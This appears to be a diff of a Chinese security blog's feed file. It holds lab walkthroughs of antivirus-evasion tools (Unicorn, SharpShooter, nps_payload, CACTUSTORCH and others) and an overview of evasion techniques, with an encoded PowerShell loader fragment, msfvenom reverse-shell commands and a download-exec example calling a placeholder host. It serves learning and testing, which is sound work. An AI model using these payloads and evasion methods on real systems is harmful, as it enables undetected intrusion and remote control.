AZwAzAEwAVABKAGsANgAwAG4AdgBGAHcAbQBZAEoAawBEADUAawB1AFIAaQBwAGwAeQBSAHkAegBlAGIAcgB0AGYANAA1AFQATwA0ACEAeABIAFcAOAAhACEAVgBDAGkAQwAxAE0AVABsADEAIQB1AFMAbwBEAEkAWgBWACsAdgBTACEAeABWAGgAbABvAG0AZgBRADAAUwBnAEUAdwBRAFMAVQBzAHgAeQArAC8ARgBDADMASQBCAGwAeABCAG4AbgBEAGoAbQB3AHgAbQBVAFYARgAxAG0AcwBXACEAVABZAHIAMABDAEsAeAAhAE8ANQBZAEQANgBrADcAZwBtAE4AIQB3ADQAWABNAEoAdABZAFoAMwBCAFgATABmADYAOQBTAGQAWgBxAEUAawBZAE4AbABiAFEAZABwAEcAbAB0AG8AWQBPAGMAdAB5AEwAWAB0AEYAKwBYAHUAawBLAHUAagBjADgAcgBnAGgARwBTAEoANAAzAEsAcwAxAEwARQBSAFQAYQBhAHIAVgBGAEoAMwBWACEAOQA0ADcAdwBIAGMAQgBYAFcAVQBLAFEAcwB6AC8ANQBJAG0AZwA0AFoAWQBEAFYAVQBDAGIAbgBFAFgAKwBOAFMAWgBtAEIAUAB5AEYAaQB6AE4ASgA1AE0AaQBEAEcANgBTAHYAeABoADcAMwB3ADUAYwB0ADQANwBaAEsAdgBLAHgAKwB4AFkAZgAhAG0AeABhAFgAdwBsAFcARABDAHAAQgAzAGoAQgByAEsARQBZADEAegBGAHYAeQA3AFEASABNAHgAWgBEAGIAeABuAFQAaQBQAG0AVgBFAHEAMQAxAFoATQBHAE0AUQB3ADYATQBXADQAVwBkAFkAWQBHAFcAVwBYAFoAIQAwACEATQBPAGMANgBvADAAKwAhADQAWgB2ADAANAA3AGkAcABoADYAegBqADMATQBHACEAOQAhAGQAbgB3AGsAUABNAFcAcQBVACEAdgAyAHkAMgBJAEsAUABpADIAegBIAHcAOABnAFEAZwBpAEwAZgB4AE4ANQBtADYASAArAG8AWQBvAHUATgBiACsAcwBaAHQAZgAvAEcARwBSADIATwBVADEAVABoAHcAdwB6ADMASQBDACsAUQB6AHkAZwBIACEASwBIAGQATwBLAFUAbABWADIAZABUAEkAbgA4ADAANgB6AEwASABXAFIAYwBNAFoAKwBtAHEAaABwAHUAWQByADkARQBzADUAeQAxAEsAKwBKAFUAeQBjAHgASABiAGgARwBCAFMAeQA4AEIAbgAxAEcAdQAhAFgASABJAEMAUQB2AGcAYwBPAG0AeABlAFQAVwA3AHUAUgBhAE8ATAB1AFcAYwB4AFgATQBjAGEAWQBGADAAWQBJAHUARwB3AFYATgBhAE0AUgBJAEwAcgBkAFYAaAB1AHgANgBvAGYAcABSAHcAaQBEACEAdwBOADQAVgBqAFQAdQBkAG8AIQBlAFUARwB5AG4AVgBHADUAeABDAFkANgA0AHUAdABOAGsAbQB4AEkAegBRADQARgBTAG8AcgBwAFMATABqAEgAaABmAEsASQBWAGQATQBLAG4AUQBZAEQAYgBTAFcAMgBIACsAdgBwAEwASQBYAFgAVgBCAFgAUQBzAG0AUgBWAGUAeQAzAEMAcABnAHoAUQBMAHUAQwA2AFEAWABjAFoAcAAhAHEAUgAhAEoATABwADAAZwBHAHQAcQBFAEQAMwBTADkAMQBaAHEAQgB4AFEAdQA2ADEAbwBsAGYAUwA2AHAANwBjAFEAZQB2AGMAbABSAFMAYwA2AEgAQwBwADkATABZAHoAVAByADMAdwArAHUANwB6AHcANAAzADIANwA5AGMAeQBMACsAdgBvAG8AbQB2AEgAQwBqAFUAbQA3AG0ASQB1AGEATgBDAGoAaQBsAG8AZgBRAHEAVwBTAC8AYQAyAHQAMQBwADkAdAB0ADcAVwA3ADUANwBiAGIATABiAGYAVgAzAHQAcwBTAG0AVQBvAHkAMQBXAGoAdAA3AHUAegBzADcAdQA3ADkAcwBkADEAMABwADEASAB5AEkAZAArAEkAQgB2AFYAdgB3AHAAdQBWAGcAdAAvAHkAdgAhAEcAVgBhAFUAZwA1AEYAbwA5AFcAVgBvAG4AdgBXAE0AagBqADAAbwAyAEcAZwB1AGsATQB5ADYAcgBQAHIAeAB1AFEATQBYACEAMABlAEQAdwBDAEsAdABZADYAbgAhAHQAZgBlADIAUgBoAFgAbQBqAFEAaABXADEATwBVAEkASgBmADgAWABPADcAdgBmAGIATABKAHMAKwBCAGQAbQAyAGQAVgBkAFAAKwAvAGoAZQBzAEYAWQBWAFEAUQBlAGUAZQBRAGoAeABYAG8AZABPADgAMwAyADQAMgAwAGUAYQBhADkAegB0AE4AdQArAGIAeQA5ADIAdgBzAGkAbQBSAHAAUABRAC8AbgBhAEsAcwBzAGsARgBxAGQAaABPAGUAVABGAEQAIQB1AC8ASAA3AG4ANABYACsAIQBzAGQAUgBuAGkASwAvAGcAdAB6AEQAVwBiAFgALwBUACsAeQA1AG8AbQAwADYANQAvAEYAZgB0AEwAeAB2ACsARQBjAGoALwBEAG8ARQBSAFoAUQByAEQAUABiAFEAbQBEAHMAWABlAGUAIQBPAEkAVQBqAG8AcgBSADIAMwBPAEUAcQBwAGkAVgBqADcANgAxAG4ATwBPAE8AKwBNAE0AagArAEQATgBEAGYATgAhAFUAOQBtAGYAawBaAFgAVgBwACsAdwBCAHIAegB4AHcAUwAvAGIAcwAxAFoATQAyAFYAVgBTAHEAeABrADgAeAB4AFgAdABTAG8AZwA5AEMAeQArAGkAeQBoAFUAMwA2AFIAOQBkAEUAZgA1AEUAbgAwAGsAIQAhAE8AdQBsADIARwB5ADkATQBjAHAANQBwAFAAeQBKAEcAYwBlAEYANwBKAEgAZQA0AGgAagB6ADcAawBWAHkAIQBEADMAagB2AGEAWAB3AFcAMAA5AHgAdgAhAEkAKwBPADEAWgBuAHkARQBmAE8AOAB2AFAAcwB2AGEAYQBvAFoARwBUAFEASwAhACEAIQA9ACIALgBSAGUAcABsAGEAYwBlACgAIgAhACIALAAgACIAQQAiACkAKQApADsAIAAkAHIAVQBlAFIAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AUwB0AHIAZQBhAG0AUgBlAGEAZABlAHIAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAASQBPAC4AQwBvAG0AcAByAGUAcwBzAGkAbwBuAC4ARwB6AGkAcABTAHQAcgBlAGEAbQAoACQASABhAHAAYgBMAFIAdABUACwAWwBJAE8ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ALgBDAG8AbQBwAHIAZQBzAHMAaQBvAG4ATQBvAGQAZQBdADoAOgBEAGUAYwBvAG0AcAByAGUAcwBzACkAKQApAC4AUgBlAGEAZABUAG8ARQBuAGQAKAApADsAIABbAFMAYwByAGkAcAB0AEIAbABvAGMAawBdADoAOgBDAHIAZQBhAHQAZQAoACQAcgBVAGUAUgApAC4ASQBuAHYAbwBrAGUAKAApAAoA</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="第五步"><a href="#第五步" class="headerlink" title="第五步"></a>第五步</h4><p><code>web</code>直接<code>run</code>，此时Win7已经可以通过上一步的url下载图片了</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212203907952.png" alt="image-20220212203907952"></p>
-<h3 id="运行效果"><a href="#运行效果" class="headerlink" title="运行效果"></a>运行效果</h3><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212204141231.png" alt="image-20220212204141231"></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212204501644.png" alt="image-20220212204501644"></p>
-<p>360全家桶对bmp图片进行扫描没有问题，但是执行ps脚本会警告</p>
-<h3 id="小结-5"><a href="#小结-5" class="headerlink" title="小结"></a>小结</h3><p>DKMC通过把shellcode注入到bmp文件中再利用powershell来执行，虽然图片没有被查杀但是powershell的行为容易被杀软注意到，后续可以对ps代码进行混淆来进一步利用</p>
-<h2 id="Unicorn"><a href="#Unicorn" class="headerlink" title="Unicorn"></a>Unicorn</h2><h3 id="安装-6"><a href="#安装-6" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/trustedsec/unicorn.git</span><br></pre></td></tr></table></figure>
-
-<h3 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h3><p>可生成ps1、macro、hta、dde等代码和文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Usage: python unicorn.py payload reverse_ipaddr port &lt;optional hta or macro, crt&gt;</span><br><span class="line">PS Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443</span><br><span class="line">PS Down/Exec: python unicorn.py windows/download_exec url=http://badurl.com/payload.exe</span><br><span class="line">PS Down/Exec Macro: python unicorn.py windows/download_exec url=http://badurl.com/payload.exe macro</span><br><span class="line">Macro Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 macro</span><br><span class="line">Macro Example CS: python unicorn.py &lt;cobalt_strike_file.cs&gt; cs macro</span><br><span class="line">HTA Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 hta</span><br><span class="line">HTA SettingContent-ms Metasploit: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 ms</span><br><span class="line">HTA Example CS: python unicorn.py &lt;cobalt_strike_file.cs&gt; cs hta</span><br><span class="line">HTA Example SettingContent-ms: python unicorn.py &lt;cobalt_strike_file.cs cs ms</span><br><span class="line">HTA Example SettingContent-ms: python unicorn.py &lt;patth_to_shellcode.txt&gt;: shellcode ms</span><br><span class="line">DDE Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 dde</span><br><span class="line">CRT Example: python unicorn.py &lt;path_to_payload/exe_encode&gt; crt</span><br><span class="line">Custom PS1 Example: python unicorn.py &lt;path to ps1 file&gt;</span><br><span class="line">Custom PS1 Example: python unicorn.py &lt;path to ps1 file&gt; macro 500</span><br><span class="line">Cobalt Strike Example: python unicorn.py &lt;cobalt_strike_file.cs&gt; cs (export CS in C# format)</span><br><span class="line">Custom Shellcode: python unicorn.py &lt;path_to_shellcode.txt&gt; shellcode (formatted 0x00 or metasploit)</span><br><span class="line">Custom Shellcode HTA: python unicorn.py &lt;path_to_shellcode.txt&gt; shellcode hta (formatted 0x00 or metasploit)</span><br><span class="line">Custom Shellcode Macro: python unicorn.py &lt;path_to_shellcode.txt&gt; shellcode macro (formatted 0x00 or metasploit)</span><br><span class="line">Generate .SettingContent-ms: python unicorn.py ms</span><br><span class="line">Help Menu: python unicorn.py --help</span><br></pre></td></tr></table></figure>
-
-<h3 id="使用-6"><a href="#使用-6" class="headerlink" title="使用"></a>使用</h3><p>生成payload</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python unicorn.py windows/meterpreter/reverse_https 192.168.221.128 4444</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212211144925.png" alt="image-20220212211144925"></p>
-<p>生成<code>powershell_attack.txt</code>和<code>unicorn.rc</code></p>
-<p>直接用<code>msfconsole -r unicorn.rc</code>快速启动MSF</p>
-<p>在目标机执行powershell脚本</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212211726185.png" alt="image-20220212211726185"></p>
-<p>360直接阻止powershell运行了</p>
-<h3 id="小结-6"><a href="#小结-6" class="headerlink" title="小结"></a>小结</h3><p>可生成代码多样，但是不经过混淆直接使用很难免杀</p>
-<h2 id="Python-Rootkit"><a href="#Python-Rootkit" class="headerlink" title="Python-Rootkit"></a>Python-Rootkit</h2><p>（待补）</p>
-<h2 id="ASWCrypter"><a href="#ASWCrypter" class="headerlink" title="ASWCrypter"></a>ASWCrypter</h2><p>该工具使用python脚本对hta代码进行编码处理，生成新的hta后门</p>
-<h3 id="安装-7"><a href="#安装-7" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/AbedAlqaderSwedan1/ASWCrypter.git</span><br></pre></td></tr></table></figure>
-
-<h3 id="使用-7"><a href="#使用-7" class="headerlink" title="使用"></a>使用</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x ASWCrypter.sh</span><br><span class="line">./ASWCrypter.sh</span><br></pre></td></tr></table></figure>
-
-<p>选择<code>G</code>，generate</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212215442859.png" alt="image-20220212215442859"></p>
-<p>配置LHOST、LPORT</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212215316449.png" alt="image-20220212215316449"></p>
-<p>如果生成payload时报错可以<code>mkdir output</code></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212215104051.png" alt="image-20220212215104051"></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212215908266.png" alt="image-20220212215908266"></p>
-<p>执行被360安全卫士警告</p>
-<h3 id="小结-7"><a href="#小结-7" class="headerlink" title="小结"></a>小结</h3><p>静态免杀效果不错，但是调用powershell的行为会被警告</p>
-<h2 id="nps-payload"><a href="#nps-payload" class="headerlink" title="nps_payload"></a>nps_payload</h2><p><code>nps_payload</code>可以⽣成基于msbuild的xml⽂件和独⽴执⾏的hta⽂件，并对xml⽂件和hta⽂件做了⼀定的混淆免杀，以达到免杀目的</p>
-<h3 id="安装-8"><a href="#安装-8" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/trustedsec/nps_payload</span><br><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure>
-
-<h3 id="使用-8"><a href="#使用-8" class="headerlink" title="使用"></a>使用</h3><p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212221042746.png" alt="image-20220212221042746"></p>
-<p>只需要使用<code>msbuild_nps.xml</code></p>
-<p>需要用<code>msbuild.exe</code>，<code>msbuild.exe</code>在windows中的一般路径<code>C:\windows\microsoft.net\framework\v4.0.30319\msbuild.exe</code></p>
-<p>Windows</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe msbuild_nps.xml</span><br></pre></td></tr></table></figure>
-
-<p>Kali</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfconsole -r msbuild_nps.rc</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212225126509.png" alt="image-20220212225126509"></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212221714694.png" alt="image-20220212221714694"></p>
-<p>动静态均未被查杀</p>
-<h3 id="小结-8"><a href="#小结-8" class="headerlink" title="小结"></a>小结</h3><p>基于白名单程序<code>msbuild.exe</code>执行payload，同时<code>nps_payload</code>对生成的文件进行了混淆，两者结合免杀效果确实强力</p>
-<h2 id="HERCULES"><a href="#HERCULES" class="headerlink" title="HERCULES"></a>HERCULES</h2><p>（安装问题，待补）</p>
-<h2 id="SpookFlare"><a href="#SpookFlare" class="headerlink" title="SpookFlare"></a>SpookFlare</h2><h3 id="安装-9"><a href="#安装-9" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/hlldz/SpookFlare.gitpip install -r requirements.txt</span><br></pre></td></tr></table></figure>
-
-<h3 id="使用-9"><a href="#使用-9" class="headerlink" title="使用"></a>使用</h3><p>直接<code>python spookflare.py</code>执行</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212230929914.png" alt="image-20220212230929914"></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212231102345.png" alt="image-20220212231102345"></p>
-<blockquote>
-<p>支持四种payload</p>
+<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><p>特征码定位到代码</p>
 <ol>
-<li>msf的exe程序(自编译)</li>
-<li>msf的ps1脚本(免杀混淆)</li>
-<li>hta</li>
-<li>office宏代码</li>
+<li>等价替换汇编代码，例如<code>mov eax，0</code>可以换成<code>xor eax，eax</code>，直接结果相同二进制代码不同</li>
+<li>在不影响逻辑的情况下，交换代码顺序</li>
+<li>代码块位移，将代码块移动到不用的内存位置，通过加入jmp addr跳过去执行</li>
 </ol>
-</blockquote>
-<p><code>info</code>可以查看需要配置的参数</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212232114869.png" alt="image-20220212232114869"></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212232546093.png" alt="image-20220212232546093"></p>
-<p>参数配置完毕以后生成C#文件，需要用<code>csc.exe</code>编译成exe</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe xxxx.cs</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212232815419.png" alt="image-20220212232815419"></p>
-<p>360全家桶第一次扫描没有查杀，过了一会被360杀毒查杀</p>
-<h3 id="小结-9"><a href="#小结-9" class="headerlink" title="小结"></a>小结</h3><p>SpookFlare会对每次生成的payload进行代码混淆处理来增加免杀概率，exe文件免杀效果一般，hta可过静态查杀</p>
-<h2 id="SharpShooter"><a href="#SharpShooter" class="headerlink" title="SharpShooter"></a>SharpShooter</h2><p>SharpShooter是武器化的Payload生成框架，支持反沙箱分析、分阶段和无阶段的Payload执行，并能够规避入口监测。</p>
-<h3 id="安装-10"><a href="#安装-10" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/mdsecactivebreach/SharpShooter</span><br><span class="line">pip install -r requirements.txt</span><br></pre></td></tr></table></figure>
-
-<h3 id="使用-10"><a href="#使用-10" class="headerlink" title="使用"></a>使用</h3><p>执行<code>python SharpShooter.py -h</code></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220212233613004.png" alt="image-20220212233613004"></p>
-<blockquote>
-<p> -h, <em>–help</em> 帮助菜单</p>
-<p> <em>–stageless</em> 创建一个不分阶段的<em>payload</em></p>
-<p> <em>–dotnetver <ver></em> 制定<em>dotnet</em>的版本，<em>2</em>或者<em>4</em></p>
-<p> <em>–com <com> COM</em> 分阶段技术*:* 如<em>outlook, shellbrowserwin,</em></p>
-<p> <em>wmi, wscript, xslremote</em>等</p>
-<p> <em>–awl <awl></em> 使用程序白名单技术*: wmic, regsvr32*</p>
-<p> <em>–awlurl <awlurl></em> 指定取回 <em>XSL/SCT payload</em>的<em>url</em>地址</p>
-<p> <em>–payload <format> Payload</em> 类型*: hta, js, jse, vbe, vbs, wsf,*</p>
-<p> <em>macro, slk</em></p>
-<p> <em>–sandbox <types></em> 绕过沙盒技术*:*</p>
-<p> [1] Key <strong>to Domain</strong> (e.g. 1=CONTOSO)</p>
-<p> [2] Ensure <strong>Domain</strong> Joined</p>
-<p> [3] <strong>Check for</strong> Sandbox Artifacts</p>
-<p> [4] <strong>Check for</strong> Bad MACs</p>
-<p> [5] <strong>Check for</strong> Debugging</p>
-<p> <em>–amsi <amsi></em> 使用<em>AMSI</em>绕过技术*: amsienable*</p>
-<p> <em>–delivery <type></em> 分发方法*: web, dns, both*</p>
-<p> <em>–rawscfile <path></em> 指定生成<em>payload</em>的<em>shellcode</em></p>
-<p> <em>–shellcode</em> 使用内置的<em>shellcode</em></p>
-<p> <em>–scfile <path></em> 指定<em>C#<em>的</em>shellcode</em>的路径</p>
-<p> <em>–refs <refs></em> 指定<em>C#<em>需要的依赖文件，如</em>mscorlib.dll</em>等</p>
-<p> <em>–namespace <ns></em> 指定<em>C#<em>的</em>Namespace</em>，如<em>Foo.bar</em></p>
-<p> <em>–entrypoint <ep></em> 指定<em>C#<em>需要执行的方法，如</em>Main</em></p>
-<p> <em>–web <web></em> 指定<em>web</em>分发的地址</p>
-<p> <em>–dns <dns></em> 指定<em>Dns</em>分发的地址</p>
-<p> <em>–output <output></em> 输出文件的名称</p>
-<p> <em>–smuggle HTML</em>内的隐藏文件</p>
-<p> <em>–template <tpl></em> 指定生成<em>html</em>的<em>template</em>文件 <em>(e.g. mcafee)</em></p>
-</blockquote>
-<p>官方文档里提供了各种payload的生成命令，使用前可以查看一下</p>
-<p>接下来尝试创建一个hta后门</p>
-<p>msfvenom生成shellcode</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 -p windows/meterpreter/reverse_https LHOST=192.168.221.128 LPORT=4444 -f raw -o shellcode.txt</span><br></pre></td></tr></table></figure>
-
-<h4 id=""><a href="#" class="headerlink" title=""></a></h4><p>用SharpShooter创建hta后门</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./shellcode.txt --sandbox 4 --smuggle --template mcafee</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220215151041983.png" alt="image-20220215151041983"></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220215151355065.png" alt="image-20220215151355065"></p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220215151612441.png" alt="image-20220215151612441"></p>
-<p>运行被查杀</p>
-<h3 id="小结-10"><a href="#小结-10" class="headerlink" title="小结"></a>小结</h3><p>这个框架比较复杂，功能强大。在本次测试只是简单的使用了其中的一些功能，免杀效果比较一般，可能是比较出名或者太老了，但是默认生成的payload还可以用其他的方法进行进一步免杀后效果应该会有所提升</p>
-<p>资料：<a href="https://www.anquanke.com/post/id/100533">https://www.anquanke.com/post/id/100533</a></p>
-<h2 id="CACTUSTORCH"><a href="#CACTUSTORCH" class="headerlink" title="CACTUSTORCH"></a>CACTUSTORCH</h2><h3 id="安装-11"><a href="#安装-11" class="headerlink" title="安装"></a>安装</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/mdsecactivebreach/CACTUSTORCH</span><br></pre></td></tr></table></figure>
-
-<h3 id="使用-11"><a href="#使用-11" class="headerlink" title="使用"></a>使用</h3><p>先用MSF或者CS生成一个32位shellcode并用base64编码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -a x86 -p windows/meterpreter/reverse_https LHOST=192.168.221.128 LPORT=4444 -f raw -o payload.bin</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220215152616661.png" alt="image-20220215152616661"></p>
-<p>复制Base64编码后的shellcode到CACTUSTORCH.js中的<code>code</code>部分</p>
-<p>PS：上面的<code>binary</code>参数也可以替换，例如：计算器（calc.exe）</p>
-<p><img src="https://blog-jasonttu.oss-cn-hangzhou.aliyuncs.com/img/image-20220215152829223.png" alt="image-20220215152829223"></p>
-<p>目标机执行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wscript.exe CACTUSTORCH.js</span><br></pre></td></tr></table></figure>
-
-<p>执行被360杀毒拦截</p>
-<h3 id="小结-11"><a href="#小结-11" class="headerlink" title="小结"></a>小结</h3><p>本工具和上一个测试的开发者相同，测试效果不太行，但是同样的可以尝试对脚本2代码进行二次免杀来提高免杀能力</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本篇多各种免杀工具进行了学习，并没有把所有功能都一一尝试过去，安装过程中出现的各种奇奇怪怪的问题总是令人抓狂，查了一堆文章水平也是参差不齐，过程有时枯燥有时免杀成功又会非常兴奋，总的来说还是有收获的</p>
-<p>杀软在不断更新迭代，免杀技术也在不断进步创新，两者在互相碰撞中发展，通过使用不断出现的免杀工具，学习工具免杀的原理和思路，也是了解免杀技术发展的一种方法</p>
-<p>最后，安装问题出现的工具后续有空会补上</p>
+<hr>
+<p>修改特征码最重要的是定位特征码，但是定位并修改特征码后不代表病毒木马程序能正常运行，各个杀软厂商的特征库不同，一般修改特征码只能对一类杀软起效。</p>
+<h3 id="添加花指令"><a href="#添加花指令" class="headerlink" title="添加花指令"></a>添加花指令</h3><p>花指令也可称之为垃圾指令。花指令本身对程序的执行结果没有影响，存在的目的是阻止反汇编程序或对反汇编设置的障碍</p>
+<p>⼤多数反病毒软件是靠特征码来判断⽂件是否有毒的，⽽为了提⾼精度，现在的特征码都是在⼀定偏移量限制之内的，否则会对反病毒软件的效率产⽣严重的影响。</p>
+<p>通过添加花指令，程序的部分偏移会受到影响。反病毒软件如果不能识别花指令，那么检测特征码的偏移量就会受到影响，从而无法正常检测木马病毒</p>
+<p><strong>如何添加花指令：</strong></p>
+<ol>
+<li>加数据计算代码，加减乘除各类组合</li>
+<li>加字符串操作代码，增加、删除、查找、替换等</li>
+<li>加多层跳转，跳转间加无效指令</li>
+<li>加貌似有效的API调用，如LoadLibrary+GetProcAddr+API等</li>
+<li>…</li>
+</ol>
+<h3 id="加壳免杀"><a href="#加壳免杀" class="headerlink" title="加壳免杀"></a>加壳免杀</h3><p>可以将加壳简单理解为：解密器/解压器+加密器/压缩器（原始代码）</p>
+<p>通过加密器/压缩器将原始代码进行加密压缩，让其特征码变化隐藏，然后组装上解密器/解压器到文件中，运行是先运行解密/解压器，将加密压缩内容解密解压，然后继续运行原始代码</p>
+<h4 id="加冷门壳"><a href="#加冷门壳" class="headerlink" title="加冷门壳"></a>加冷门壳</h4><p>壳也有特征，知名的壳很容易被识别出来，或者自动脱壳并查杀</p>
+<h4 id="改壳"><a href="#改壳" class="headerlink" title="改壳"></a>改壳</h4><p>将开源的压缩壳进行修改，比如修改入口，区段信息修改，入口代码移位</p>
+<h3 id="内存免杀"><a href="#内存免杀" class="headerlink" title="内存免杀"></a>内存免杀</h3><p>大多数反病毒软件的文件扫描与内存扫描采用的不是同一套特征码，文件免杀只能过静态文件扫描，执行时会读入内存，没有做内存免杀还是会被杀软识别出来</p>
+<p>如果是利用Windows自身提供的API来将加密或者封装好的shellcode写入到内存执行的话,将会大大增加查杀的难度</p>
+<h3 id="二次编译"><a href="#二次编译" class="headerlink" title="二次编译"></a>二次编译</h3><p>通过各种编码器、各种语言对shellcode进行二次编码从而达到免杀效果</p>
+<h3 id="分离免杀"><a href="#分离免杀" class="headerlink" title="分离免杀"></a>分离免杀</h3><p>将shellcode和加载器分离。shellcode的加载器本身并不包含恶意代码，当加载器运行时，从程序之外加载shellcode执行</p>
+<p>将PE文件以某种加密方式进行存储后使用加载器读取PE文件并且解密，最后放入内存中执行</p>
+<h3 id="资源修改"><a href="#资源修改" class="headerlink" title="资源修改"></a>资源修改</h3><p>有些杀软设置有扫描白名单，比如程序图标为杀软就可过查杀</p>
+<h4 id="加资源"><a href="#加资源" class="headerlink" title="加资源"></a>加资源</h4><p>使用ResHacker对文件进行资源操作，将正常软件的资源（如图片、版本信息、对话框等）加入到自己的软件</p>
+<h4 id="替换资源"><a href="#替换资源" class="headerlink" title="替换资源"></a>替换资源</h4><p>使用ResHacker替换无用资源（Version等）</p>
+<h4 id="加签名"><a href="#加签名" class="headerlink" title="加签名"></a>加签名</h4><p>使用签名伪造工具，将正常软件的签名信息假如自己的软件中</p>
 ]]></content>
       <tags>
         <tag>渗透测试</tag>
@@ -1950,89 +1678,361 @@
       </tags>
   </entry>
   <entry>
-    <title>远控免杀——概念</title>
-    <url>/2022/02/06/%E8%BF%9C%E6%8E%A7%E5%85%8D%E6%9D%80%E2%80%94%E2%80%94%E6%A6%82%E5%BF%B5/</url>
-    <content><![CDATA[<h1 id="远控免杀——概念"><a href="#远控免杀——概念" class="headerlink" title="远控免杀——概念"></a>远控免杀——概念</h1><h2 id="免杀概念"><a href="#免杀概念" class="headerlink" title="免杀概念"></a>免杀概念</h2><p><em>免杀</em>技术全称为反杀毒技术Anti Anti- Virus简称“<em>免杀</em>”，它指的是一种能使病毒木马免于被杀毒软件查杀的技术</p>
+    <title>远控免杀——工具篇</title>
+    <url>/2022/02/15/%E8%BF%9C%E6%8E%A7%E5%85%8D%E6%9D%80%E2%80%94%E2%80%94%E5%B7%A5%E5%85%B7%E7%AF%87/</url>
+    <content><![CDATA[<h1 id="远控免杀——工具篇"><a href="#远控免杀——工具篇" class="headerlink" title="远控免杀——工具篇"></a>远控免杀——工具篇</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>免杀对个人而言是一个熟悉又陌生的概念，之前只知道msf上进行简单的encode来免杀，现在还是从基本的工具开始学起</p>
+<p>实验环境采用Kali+Win7虚拟机，测试机安装360全家桶</p>
 <span id="more"></span>
 
-<h2 id="杀软检测方式"><a href="#杀软检测方式" class="headerlink" title="杀软检测方式"></a>杀软检测方式</h2><h3 id="扫描技术"><a href="#扫描技术" class="headerlink" title="扫描技术"></a>扫描技术</h3><ol>
-<li>扫描压缩包：对压缩包和封装文件作分析检测</li>
-<li>程序篡改防护：避免恶意程序通过篡改删除杀毒侦测程序从而破坏电脑</li>
-<li>修复技术：对被恶意程序损坏的文件进行还原</li>
-<li>急救盘杀毒：利用空白U盘制作急救启动盘来检测电脑病毒</li>
-<li>智能扫描：扫描检测常用磁盘、系统关键位置，耗时较短</li>
-<li>全盘扫描：扫描全部磁盘，耗时较长</li>
-<li>勒索软件防护：保护电脑中的文件不被恶意加密</li>
-<li>开机扫描：开机自动扫描，扫描压缩文档和可能不需要的程序</li>
-</ol>
